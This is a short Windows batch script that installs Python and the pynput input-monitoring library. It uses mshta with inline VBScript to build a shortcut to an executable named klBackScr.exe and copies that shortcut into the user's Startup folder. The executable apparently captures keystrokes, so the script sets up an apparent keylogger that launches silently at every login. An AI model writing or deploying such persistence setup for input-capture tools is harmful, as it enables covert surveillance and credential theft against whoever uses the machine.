@echo off
start hook/python-3.6.6rc1-amd64-webinstall.exe 
pip install pynput -i https://pypi.tuna.tsinghua.edu.cn/simple 
set "exe=klBackScr.exe"
set "lnk=klBackScr"
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(""%lnk%.lnk""):b.TargetPath=""%~dp0%exe%"":b.WorkingDirectory=""%~dp0"":b.Save:close")
copy klBackScr.lnk %appdata%"\Microsoft\Windows\Start Menu\Programs\Startup\klBackScr.lnk"
exit